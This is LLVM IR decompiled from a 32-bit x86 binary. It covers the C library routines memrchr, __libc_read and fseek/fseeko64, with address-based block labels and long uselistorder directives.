define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_804f97d = urem i32 %arg2, 256
  %v4_804f989 = sext i8 %arg1 to i32
  %v2_804f98d = add i32 %v4_804f989, %arg3
  %v1_804f99f7 = icmp eq i32 %arg3, 0
  br i1 %v1_804f99f7, label %dec_label_pc_804f9a7, label %dec_label_pc_804f9a3

dec_label_pc_804f991:                             ; preds = %dec_label_pc_804f9a3
  %v1_804f991 = add i32 %v0_804f991, -1
  %v5_804f992 = load i32, i32* @edx, align 4
  %v6_804f992 = and i32 %v5_804f992, -256
  %v7_804f992 = or i32 %v6_804f992, %v4_804f97d
  store i32 %v7_804f992, i32* @edx, align 4
  %v1_804f996 = inttoptr i32 %v1_804f991 to i8*
  %v2_804f996 = load i8, i8* %v1_804f996, align 1
  %v15_804f996 = icmp eq i8 %v2_804f996, %tmp
  br i1 %v15_804f996, label %dec_label_pc_804fa24, label %dec_label_pc_804f99e

dec_label_pc_804f99e:                             ; preds = %dec_label_pc_804f991
  %v1_804f99e = add i32 %v0_804f99e, -1
  %v8_804f99e = icmp eq i32 %v1_804f99e, 0
  br i1 %v8_804f99e, label %dec_label_pc_804f9a7, label %dec_label_pc_804f9a3

dec_label_pc_804f9a3:                             ; preds = %entry, %dec_label_pc_804f99e
  %v0_804f99e = phi i32 [ %v1_804f99e, %dec_label_pc_804f99e ], [ %arg3, %entry ]
  %v0_804f991 = phi i32 [ %v1_804f991, %dec_label_pc_804f99e ], [ %v2_804f98d, %entry ]
  %v2_804f9a3 = urem i32 %v0_804f991, 4
  %v3_804f9a3 = icmp eq i32 %v2_804f9a3, 0
  %v1_804f9a5 = icmp eq i1 %v3_804f9a3, false
  br i1 %v1_804f9a5, label %dec_label_pc_804f991, label %dec_label_pc_804f9a7

dec_label_pc_804f9a7:                             ; preds = %dec_label_pc_804f99e, %dec_label_pc_804f9a3, %entry
  %v0_804fa0a.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_804f99e ], [ %v0_804f99e, %dec_label_pc_804f9a3 ]
  %v0_804f9ac = phi i32 [ %v2_804f98d, %entry ], [ %v1_804f991, %dec_label_pc_804f99e ], [ %v0_804f991, %dec_label_pc_804f9a3 ]
  store i32 %v0_804f9ac, i32* @ecx, align 4
  %v2_804f9b0 = mul nuw nsw i32 %v4_804f97d, 256
  %v2_804f9b3 = or i32 %v2_804f9b0, %v4_804f97d
  %v2_804f9b7 = mul i32 %v2_804f9b3, 65536
  %v2_804f9ba = or i32 %v2_804f9b7, %v2_804f9b3
  %v6_804fa0d50 = icmp ugt i32 %v0_804fa0a.pr, 3
  br i1 %v6_804fa0d50, label %dec_label_pc_804f9be, label %dec_label_pc_804fa0f

dec_label_pc_804f9be:                             ; preds = %dec_label_pc_804f9a7, %dec_label_pc_804fa07
  %v0_804fa0752 = phi i32 [ %v1_804fa07, %dec_label_pc_804fa07 ], [ %v0_804fa0a.pr, %dec_label_pc_804f9a7 ]
  %v0_804f9be51 = phi i32 [ %v1_804f9be, %dec_label_pc_804fa07 ], [ %v0_804f9ac, %dec_label_pc_804f9a7 ]
  %v1_804f9be = add i32 %v0_804f9be51, -4
  store i32 %v1_804f9be, i32* @ecx, align 4
  %v2_804f9c3 = inttoptr i32 %v1_804f9be to i32*
  %v3_804f9c3 = load i32, i32* %v2_804f9c3, align 4
  %v4_804f9c3 = xor i32 %v3_804f9c3, %v2_804f9ba
  %v1_804f9c5 = add i32 %v4_804f9c3, 2130640639
  %v1_804f9cb = sub i32 -1, %v4_804f9c3
  %v2_804f9cd = xor i32 %v1_804f9c5, %v1_804f9cb
  %v1_804f9cf = and i32 %v2_804f9cd, -2130640640
  %v2_804f9cf = icmp eq i32 %v1_804f9cf, 0
  br i1 %v2_804f9cf, label %dec_label_pc_804fa07, label %dec_label_pc_804f9d7

dec_label_pc_804f9d7:                             ; preds = %dec_label_pc_804f9be
  %v7_804f9d7 = or i32 %v1_804f9cf, %v4_804f97d
  %v1_804f9db = add i32 %v0_804f9be51, -1
  %v2_804f9de = inttoptr i32 %v1_804f9db to i8*
  %v3_804f9de = load i8, i8* %v2_804f9de, align 1
  %v16_804f9de = icmp eq i8 %v3_804f9de, %tmp
  br i1 %v16_804f9de, label %dec_label_pc_804fa24, label %dec_label_pc_804f9e3

dec_label_pc_804f9e3:                             ; preds = %dec_label_pc_804f9d7
  %v1_804f9e7 = add i32 %v0_804f9be51, -2
  %v2_804f9ea = inttoptr i32 %v1_804f9e7 to i8*
  %v3_804f9ea = load i8, i8* %v2_804f9ea, align 1
  %v16_804f9ea = icmp eq i8 %v3_804f9ea, %tmp
  br i1 %v16_804f9ea, label %dec_label_pc_804fa24, label %dec_label_pc_804f9ef

dec_label_pc_804f9ef:                             ; preds = %dec_label_pc_804f9e3
  %v1_804f9f3 = add i32 %v0_804f9be51, -3
  %v2_804f9f6 = inttoptr i32 %v1_804f9f3 to i8*
  %v3_804f9f6 = load i8, i8* %v2_804f9f6, align 1
  %v16_804f9f6 = icmp eq i8 %v3_804f9f6, %tmp
  br i1 %v16_804f9f6, label %dec_label_pc_804fa24, label %dec_label_pc_804f9fb

dec_label_pc_804f9fb:                             ; preds = %dec_label_pc_804f9ef
  %v1_804f9ff = inttoptr i32 %v1_804f9be to i8*
  %v2_804f9ff = load i8, i8* %v1_804f9ff, align 1
  %v15_804f9ff = icmp eq i8 %v2_804f9ff, %tmp
  %v1_804fa01 = icmp eq i1 %v15_804f9ff, false
  br i1 %v1_804fa01, label %dec_label_pc_804fa07, label %dec_label_pc_804fa03

dec_label_pc_804fa03:                             ; preds = %dec_label_pc_804f9fb
  br label %dec_label_pc_804fa24

dec_label_pc_804fa07:                             ; preds = %dec_label_pc_804f9fb, %dec_label_pc_804f9be
  %v5_804fa1427 = phi i32 [ %v7_804f9d7, %dec_label_pc_804f9fb ], [ 0, %dec_label_pc_804f9be ]
  %v1_804fa07 = add i32 %v0_804fa0752, -4
  %v6_804fa0d = icmp ugt i32 %v1_804fa07, 3
  br i1 %v6_804fa0d, label %dec_label_pc_804f9be, label %dec_label_pc_804fa0f

dec_label_pc_804fa0f:                             ; preds = %dec_label_pc_804fa07, %dec_label_pc_804f9a7
  %v5_804fa1426.lcssa = phi i32 [ %v4_804f97d, %dec_label_pc_804f9a7 ], [ %v5_804fa1427, %dec_label_pc_804fa07 ]
  %v0_804f9be.lcssa = phi i32 [ %v0_804f9ac, %dec_label_pc_804f9a7 ], [ %v1_804f9be, %dec_label_pc_804fa07 ]
  %v0_804fa07.lcssa = phi i32 [ %v0_804fa0a.pr, %dec_label_pc_804f9a7 ], [ %v1_804fa07, %dec_label_pc_804fa07 ]
  br label %dec_label_pc_804fa1c

dec_label_pc_804fa13:                             ; preds = %dec_label_pc_804fa1c
  %v1_804fa1c = add i32 %v0_804fa1c, -1
  %v1_804fa13 = add i32 %v0_804fa13, -1
  %v6_804fa14 = and i32 %v5_804fa14, -256
  %v7_804fa14 = or i32 %v6_804fa14, %v4_804f97d
  %v1_804fa18 = inttoptr i32 %v1_804fa13 to i8*
  %v2_804fa18 = load i8, i8* %v1_804fa18, align 1
  %v15_804fa18 = icmp eq i8 %v2_804fa18, %tmp
  br i1 %v15_804fa18, label %dec_label_pc_804fa24, label %dec_label_pc_804fa1c

dec_label_pc_804fa1c:                             ; preds = %dec_label_pc_804fa13, %dec_label_pc_804fa0f
  %v5_804fa14 = phi i32 [ %v7_804fa14, %dec_label_pc_804fa13 ], [ %v5_804fa1426.lcssa, %dec_label_pc_804fa0f ]
  %v0_804fa13 = phi i32 [ %v1_804fa13, %dec_label_pc_804fa13 ], [ %v0_804f9be.lcssa, %dec_label_pc_804fa0f ]
  %v0_804fa1c = phi i32 [ %v1_804fa1c, %dec_label_pc_804fa13 ], [ %v0_804fa07.lcssa, %dec_label_pc_804fa0f ]
  %v10_804fa1d = icmp eq i32 %v0_804fa1c, 0
  %v1_804fa20 = icmp eq i1 %v10_804fa1d, false
  br i1 %v1_804fa20, label %dec_label_pc_804fa13, label %dec_label_pc_804fa22

dec_label_pc_804fa22:                             ; preds = %dec_label_pc_804fa1c
  br label %dec_label_pc_804fa24

dec_label_pc_804fa24:                             ; preds = %dec_label_pc_804f991, %dec_label_pc_804f9ef, %dec_label_pc_804f9e3, %dec_label_pc_804f9d7, %dec_label_pc_804fa13, %dec_label_pc_804fa03, %dec_label_pc_804fa22
  %v0_804fa27 = phi i32 [ %v1_804f9be, %dec_label_pc_804fa03 ], [ 0, %dec_label_pc_804fa22 ], [ %v1_804fa13, %dec_label_pc_804fa13 ], [ %v1_804f9f3, %dec_label_pc_804f9ef ], [ %v1_804f9e7, %dec_label_pc_804f9e3 ], [ %v1_804f9db, %dec_label_pc_804f9d7 ], [ %v1_804f991, %dec_label_pc_804f991 ]
  ret i32 %v0_804fa27

; uselistorder directives
  uselistorder i32 %v0_804fa1c, { 1, 0 }
  uselistorder i32 %v1_804fa07, { 0, 2, 1 }
  uselistorder i32 %v1_804f9be, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_804f9be51, { 3, 2, 1, 0 }
  uselistorder i32 %v2_804f9b3, { 1, 0 }
  uselistorder i32 %v0_804f991, { 1, 0, 2 }
  uselistorder i32 %v2_804f98d, { 1, 0 }
  uselistorder i32 %v4_804f97d, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 -3, { 0, 2, 1, 3 }
  uselistorder i32 -2, { 2, 6, 12, 13, 1, 0, 7, 8, 9, 14, 18, 15, 16, 17, 3, 5, 4, 10, 11 }
  uselistorder i32 65536, { 0, 2, 1, 4, 3, 6, 5, 8, 7, 9, 10, 11, 12, 13, 15, 16, 14, 17, 23, 18, 19, 20, 21, 24, 27, 22, 25, 26 }
  uselistorder i32 -256, { 15, 16, 17, 18, 19, 20, 21, 22, 23, 56, 24, 25, 26, 27, 28, 0, 29, 30, 1, 31, 32, 33, 83, 3, 57, 2, 58, 34, 35, 59, 61, 84, 5, 49, 48, 4, 62, 63, 64, 65, 8, 66, 6, 67, 7, 68, 75, 10, 51, 50, 9, 52, 53, 54, 69, 85, 70, 71, 47, 60, 36, 37, 38, 40, 39, 41, 42, 43, 44, 45, 46, 55, 73, 72, 74, 80, 77, 12, 78, 13, 79, 11, 76, 14, 81, 82 }
  uselistorder i32 256, { 1, 2, 3, 4, 42, 43, 5, 44, 6, 9, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 47, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 54, 29, 30, 31, 46, 32, 48, 52, 49, 33, 34, 53, 35, 36, 0, 50, 51, 45, 37, 38, 39, 40, 41 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804fa24, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_804f9be, { 1, 0 }
  uselistorder label %dec_label_pc_804f9a7, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f9a3, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fa28 = load i32, i32* @edi, align 4
  store i32 %v0_804fa28, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804fa38 = load i32, i32* @ebx, align 4
  %v4_804fa40 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804fa38, i32* @ebx, align 4
  store i32 %v4_804fa40, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v4_804fa40, -4095
  br i1 %tmp11, label %dec_label_pc_804fa58, label %dec_label_pc_804fa4c

dec_label_pc_804fa4c:                             ; preds = %entry
  %v1_804fa4c = call i32 @__errno_location(i32 %v0_804fa38)
  %v0_804fa51 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fa51 = sub i32 0, %v0_804fa51
  %v2_804fa53 = inttoptr i32 %v1_804fa4c to i32*
  store i32 %v1_804fa51, i32* %v2_804fa53, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fa58

dec_label_pc_804fa58:                             ; preds = %entry, %dec_label_pc_804fa4c
  %v0_804fa58 = phi i32 [ %v4_804fa40, %entry ], [ -1, %dec_label_pc_804fa4c ]
  %v2_804fa5c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fa5c, i32* @edi, align 4
  ret i32 %v0_804fa58

; uselistorder directives
  uselistorder i32 %v4_804fa40, { 1, 0, 2 }
  uselistorder i32 %v0_804fa38, { 1, 0 }
  uselistorder label %dec_label_pc_804fa58, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_804fa6b = ashr i32 %arg2, 31
  %v4_804fa72 = inttoptr i32 %arg1 to i16*
  %v5_804fa72 = call i32 @__GI_fseeko64(i16* %v4_804fa72, i32 %arg2, i32 %v1_804fa6b, i32 %arg3)
  ret i32 %v5_804fa72
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_804fa7c = load i32, i32* @ebp, align 4
  %v0_804fa7d = load i32, i32* @edi, align 4
  %v0_804fa7e = load i32, i32* @esi, align 4
  %v0_804fa7f = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_804fa8f = ptrtoint i16* %arg1 to i32
  store i32 %v4_804fa8f, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp27 = icmp ult i32 %arg4, 3
  br i1 %tmp27, label %dec_label_pc_804fab3, label %dec_label_pc_804faa0

dec_label_pc_804faa0:                             ; preds = %entry
  %v1_804faa0 = call i32 @__errno_location(i32 %arg2)
  store i32 %v1_804faa0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_804faa8 = inttoptr i32 %v1_804faa0 to i32*
  store i32 22, i32* %v1_804faa8, align 4
  br label %dec_label_pc_804fb55

dec_label_pc_804fab3:                             ; preds = %entry
  %v1_804fab3 = add i32 %v4_804fa8f, 52
  %v2_804fab3 = inttoptr i32 %v1_804fab3 to i32*
  %v3_804fab3 = load i32, i32* %v2_804fab3, align 4
  %v1_804fab6 = icmp eq i32 %v3_804fab3, 0
  %v1_804fab8 = icmp eq i1 %v1_804fab6, false
  br i1 %v1_804fab8, label %dec_label_pc_804fad9, label %dec_label_pc_804faba

dec_label_pc_804faba:                             ; preds = %dec_label_pc_804fab3
  %v1_804faba = add i32 %v4_804fa8f, 56
  store i32 %v1_804faba, i32* @ebx, align 4
  %v2_804fac4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804fac4, i32* @eax, align 4
  %v3_804fac9 = call i32 @__pthread_return_void(i32 %v2_804fac4, i32 134526403)
  store i32 %v3_804fac9, i32* %eax.global-to-local, align 4
  %v0_804face = load i32, i32* @ebx, align 4
  %v2_804fad1 = call i32 @__pthread_return_0(i32 %v0_804face)
  store i32 %v2_804fad1, i32* %eax.global-to-local, align 4
  %v0_804fad9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804fad9

dec_label_pc_804fad9:                             ; preds = %dec_label_pc_804fab3, %dec_label_pc_804faba
  %v0_804fae1 = phi i32 [ %v4_804fa8f, %dec_label_pc_804fab3 ], [ %v0_804fad9.pre, %dec_label_pc_804faba ]
  %v1_804fad9 = inttoptr i32 %v0_804fae1 to i8*
  %v2_804fad9 = load i8, i8* %v1_804fad9, align 1
  %v3_804fad9 = and i8 %v2_804fad9, 64
  %v4_804fad9 = icmp eq i8 %v3_804fad9, 0
  br i1 %v4_804fad9, label %dec_label_pc_804faee, label %dec_label_pc_804fade

dec_label_pc_804fade:                             ; preds = %dec_label_pc_804fad9
  %v2_804fae2 = call i32 @__stdio_wcommit(i32 %v0_804fae1)
  store i32 %v2_804fae2, i32* %eax.global-to-local, align 4
  %v1_804faea = icmp eq i32 %v2_804fae2, 0
  %v1_804faec = icmp eq i1 %v1_804faea, false
  br i1 %v1_804faec, label %dec_label_pc_804fb3d, label %dec_label_pc_804faee

dec_label_pc_804faee:                             ; preds = %dec_label_pc_804fade, %dec_label_pc_804fad9
  %v0_804faee = load i32, i32* @edi, align 4
  %v9_804faee = icmp eq i32 %v0_804faee, 1
  %v1_804faf1 = icmp eq i1 %v9_804faee, false
  br i1 %v1_804faf1, label %dec_label_pc_804faee.dec_label_pc_804fb07_crit_edge, label %dec_label_pc_804faf3

dec_label_pc_804faee.dec_label_pc_804fb07_crit_edge: ; preds = %dec_label_pc_804faee
  %.pre5 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_804fb07

dec_label_pc_804faf3:                             ; preds = %dec_label_pc_804faee
  %v0_804faf3 = load i32, i32* @ecx, align 4
  %v2_804faf5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804faf5, i32* %eax.global-to-local, align 4
  %v0_804fafa = load i32, i32* @esi, align 4
  %tmp25 = inttoptr i32 %v0_804fafa to i32*
  %v6_804fafb = call i32 @__stdio_adjust_position(i32* %tmp25, i32 %v2_804faf5, i32 %v0_804faf3, i32 %v0_804faf3)
  store i32 %v6_804fafb, i32* %eax.global-to-local, align 4
  %v2_804fb03 = icmp slt i32 %v6_804fafb, 0
  br i1 %v2_804fb03, label %dec_label_pc_804fb3d, label %dec_label_pc_804faf3.dec_label_pc_804fb07_crit_edge

dec_label_pc_804faf3.dec_label_pc_804fb07_crit_edge: ; preds = %dec_label_pc_804faf3
  %v0_804fb08.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804fb07

dec_label_pc_804fb07:                             ; preds = %dec_label_pc_804faee.dec_label_pc_804fb07_crit_edge, %dec_label_pc_804faf3.dec_label_pc_804fb07_crit_edge
  %v2_804fb09.pre-phi = phi i32 [ %.pre5, %dec_label_pc_804faee.dec_label_pc_804fb07_crit_edge ], [ %v2_804faf5, %dec_label_pc_804faf3.dec_label_pc_804fb07_crit_edge ]
  %v0_804fb08 = phi i32 [ %v0_804faee, %dec_label_pc_804faee.dec_label_pc_804fb07_crit_edge ], [ %v0_804fb08.pre, %dec_label_pc_804faf3.dec_label_pc_804fb07_crit_edge ]
  %v0_804fb07 = load i32, i32* @edx, align 4
  store i32 %v2_804fb09.pre-phi, i32* %eax.global-to-local, align 4
  %v0_804fb0e = load i32, i32* @esi, align 4
  %v5_804fb0f = inttoptr i32 %v2_804fb09.pre-phi to i32*
  %v6_804fb0f = call i32 @__stdio_seek(i32 %v0_804fb0e, i32* %v5_804fb0f, i32 %v0_804fb08, i32 %v0_804fb07)
  store i32 %v6_804fb0f, i32* %eax.global-to-local, align 4
  %v2_804fb17 = icmp slt i32 %v6_804fb0f, 0
  br i1 %v2_804fb17, label %dec_label_pc_804fb3d, label %dec_label_pc_804fb1b

dec_label_pc_804fb1b:                             ; preds = %dec_label_pc_804fb07
  %v0_804fb1b = load i32, i32* @esi, align 4
  %v1_804fb1b = inttoptr i32 %v0_804fb1b to i16*
  %v2_804fb1b = load i16, i16* %v1_804fb1b, align 2
  %v3_804fb1b = and i16 %v2_804fb1b, -72
  store i16 %v3_804fb1b, i16* %v1_804fb1b, align 2
  %v0_804fb1f = load i32, i32* @esi, align 4
  %v1_804fb1f = add i32 %v0_804fb1f, 8
  %v2_804fb1f = inttoptr i32 %v1_804fb1f to i32*
  %v3_804fb1f = load i32, i32* %v2_804fb1f, align 4
  store i32 %v3_804fb1f, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v2_804fb24 = add i32 %v0_804fb1f, 16
  %v3_804fb24 = inttoptr i32 %v2_804fb24 to i32*
  store i32 %v3_804fb1f, i32* %v3_804fb24, align 4
  %v0_804fb27 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fb27 = load i32, i32* @esi, align 4
  %v2_804fb27 = add i32 %v1_804fb27, 20
  %v3_804fb27 = inttoptr i32 %v2_804fb27 to i32*
  store i32 %v0_804fb27, i32* %v3_804fb27, align 4
  %v0_804fb2a = load i32, i32* %eax.global-to-local, align 4
  %v1_804fb2a = load i32, i32* @esi, align 4
  %v2_804fb2a = add i32 %v1_804fb2a, 24
  %v3_804fb2a = inttoptr i32 %v2_804fb2a to i32*
  store i32 %v0_804fb2a, i32* %v3_804fb2a, align 4
  %v0_804fb2d = load i32, i32* %eax.global-to-local, align 4
  %v1_804fb2d = load i32, i32* @esi, align 4
  %v2_804fb2d = add i32 %v1_804fb2d, 28
  %v3_804fb2d = inttoptr i32 %v2_804fb2d to i32*
  store i32 %v0_804fb2d, i32* %v3_804fb2d, align 4
  %v0_804fb30 = load i32, i32* @esi, align 4
  %v1_804fb30 = add i32 %v0_804fb30, 44
  %v2_804fb30 = inttoptr i32 %v1_804fb30 to i32*
  store i32 0, i32* %v2_804fb30, align 4
  %v0_804fb37 = load i32, i32* @esi, align 4
  %v1_804fb37 = add i32 %v0_804fb37, 2
  %v2_804fb37 = inttoptr i32 %v1_804fb37 to i8*
  store i8 0, i8* %v2_804fb37, align 1
  br label %dec_label_pc_804fb40

dec_label_pc_804fb3d:                             ; preds = %dec_label_pc_804fb07, %dec_label_pc_804faf3, %dec_label_pc_804fade
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fb40

dec_label_pc_804fb40:                             ; preds = %dec_label_pc_804fb1b, %dec_label_pc_804fb3d
  br i1 %v1_804fab8, label %dec_label_pc_804fb55, label %dec_label_pc_804fb44

dec_label_pc_804fb44:                             ; preds = %dec_label_pc_804fb40
  %v2_804fb48 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804fb48, i32* @eax, align 4
  %v3_804fb4d = call i32 @__pthread_return_void(i32 %v2_804fb48, i32 1)
  store i32 %v3_804fb4d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fb55

dec_label_pc_804fb55:                             ; preds = %dec_label_pc_804fb40, %dec_label_pc_804faa0, %dec_label_pc_804fb44
  %v0_804fb58 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804fb58, i32* %eax.global-to-local, align 4
  store i32 %v0_804fa7f, i32* @ebx, align 4
  store i32 %v0_804fa7e, i32* @esi, align 4
  store i32 %v0_804fa7d, i32* @edi, align 4
  store i32 %v0_804fa7c, i32* @ebp, align 4
  ret i32 %v0_804fb58

; uselistorder directives
  uselistorder i32 %v2_804fb09.pre-phi, { 1, 0 }
  uselistorder i32 %v0_804faee, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 28, { 7, 8, 18, 9, 10, 11, 12, 13, 14, 0, 15, 19, 20, 16, 17, 21, 22, 32, 23, 33, 31, 24, 25, 2, 26, 27, 28, 29, 30, 3, 4, 5, 1, 6 }
  uselistorder i32 24, { 3, 4, 14, 15, 16, 5, 6, 7, 8, 9, 10, 11, 17, 18, 19, 22, 1, 20, 0, 2, 12, 21, 13 }
  uselistorder i32* @ecx, { 36, 37, 38, 29, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 25, 65, 66, 67, 68, 111, 69, 70, 26, 71, 23, 27, 4, 6, 24, 5, 112, 113, 114, 115, 72, 73, 74, 75, 76, 77, 78, 28, 79, 7, 80, 81, 82, 83, 84, 13, 14, 0, 1, 85, 86, 15, 87, 88, 89, 90, 91, 93, 94, 95, 96, 34, 35, 92, 116, 117, 16, 118, 119, 120, 121, 17, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 97, 102, 98, 99, 100, 101, 138, 8, 9, 103, 2, 104, 139, 201, 140, 11, 20, 141, 142, 18, 10, 19, 143, 144, 145, 146, 147, 148, 197, 198, 199, 200, 12, 105, 3, 106, 30, 202, 203, 107, 108, 109, 110, 204, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 21, 175, 150, 151, 152, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 22, 190, 191, 193, 194, 195, 192, 205, 149, 31, 206, 207, 32, 33, 196 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 6, 1, 5, 4, 3, 2, 0 }
  uselistorder i8 0, { 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0, 62, 63, 64, 111, 65, 29, 3, 6, 7, 30, 5, 4, 112, 113, 114, 66, 67, 40, 68, 115, 69, 70, 71, 72, 73, 74, 75, 8, 76, 77, 9, 78, 79, 80, 81, 82, 83, 84, 85, 42, 176, 86, 11, 121, 116, 117, 10, 119, 120, 118, 26, 122, 1, 2, 87, 88, 123, 124, 28, 126, 12, 14, 102, 101, 13, 31, 127, 128, 129, 130, 131, 132, 133, 177, 134, 135, 136, 137, 138, 17, 144, 140, 141, 139, 15, 142, 143, 16, 27, 145, 146, 147, 148, 149, 150, 151, 166, 167, 19, 104, 103, 18, 105, 106, 152, 178, 180, 107, 32, 41, 108, 20, 179, 154, 155, 156, 157, 158, 159, 160, 161, 162, 33, 163, 99, 125, 89, 21, 90, 91, 92, 93, 94, 95, 96, 97, 98, 100, 109, 110, 153, 164, 165, 168, 169, 174, 173, 22, 170, 171, 24, 172, 23, 175, 25, 43, 34, 35, 36, 37, 38, 39 }
  uselistorder i8 64, { 1, 0, 2, 3, 4, 7, 5, 6 }
  uselistorder i32 (i32)* @__pthread_return_0, { 30, 26, 25, 24, 23, 22, 21, 5, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 4, 8, 29, 28, 27, 3, 2, 1, 6, 0, 7 }
  uselistorder i32 (i32, i32)* @__pthread_return_void, { 53, 52, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 2, 1, 9, 8, 51, 50, 49, 48, 47, 46, 5, 4, 3, 0, 7, 6 }
  uselistorder i32 134526403, { 2, 17, 18, 3, 4, 5, 6, 19, 20, 21, 22, 7, 8, 24, 25, 26, 27, 28, 29, 0, 9, 10, 11, 12, 13, 14, 15, 16, 1, 23 }
  uselistorder i32 56, { 2, 0, 3, 4, 5, 13, 6, 7, 8, 9, 10, 11, 12, 1 }
  uselistorder i32 52, { 5, 6, 7, 13, 8, 9, 1, 10, 0, 2, 3, 4, 11, 12 }
  uselistorder i32 22, { 1, 2, 3, 8, 10, 11, 0, 4, 5, 6, 7, 9 }
  uselistorder i32* @esi, { 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 9, 48, 49, 50, 51, 52, 53, 0, 54, 143, 144, 145, 146, 147, 148, 33, 149, 55, 10, 56, 34, 30, 286, 287, 288, 289, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 12, 68, 1, 70, 71, 72, 73, 11, 74, 75, 69, 76, 77, 78, 79, 2, 80, 81, 82, 83, 84, 85, 31, 13, 86, 87, 14, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 15, 105, 106, 107, 16, 37, 88, 3, 89, 90, 108, 109, 110, 111, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 35, 112, 113, 17, 7, 119, 114, 115, 116, 117, 118, 169, 18, 170, 171, 175, 172, 173, 174, 182, 176, 177, 178, 179, 180, 181, 290, 19, 291, 292, 183, 184, 185, 186, 187, 188, 189, 20, 8, 190, 191, 192, 193, 194, 21, 32, 195, 196, 197, 198, 199, 200, 22, 201, 202, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 203, 204, 205, 206, 23, 207, 208, 209, 210, 211, 212, 213, 214, 24, 25, 215, 26, 216, 217, 218, 27, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 4, 229, 230, 231, 232, 233, 234, 235, 236, 135, 136, 137, 138, 139, 237, 238, 239, 240, 303, 304, 128, 129, 130, 305, 306, 307, 308, 309, 310, 311, 319, 315, 316, 317, 318, 312, 313, 314, 120, 121, 122, 123, 241, 242, 243, 5, 244, 245, 246, 124, 125, 126, 127, 254, 258, 28, 259, 260, 261, 262, 263, 264, 265, 255, 256, 257, 266, 267, 268, 269, 270, 271, 272, 6, 273, 274, 275, 276, 29, 277, 36, 278, 279, 280, 281, 247, 248, 249, 250, 251, 252, 253, 133, 134, 282, 283, 131, 132, 140, 141, 142, 284, 285, 320 }
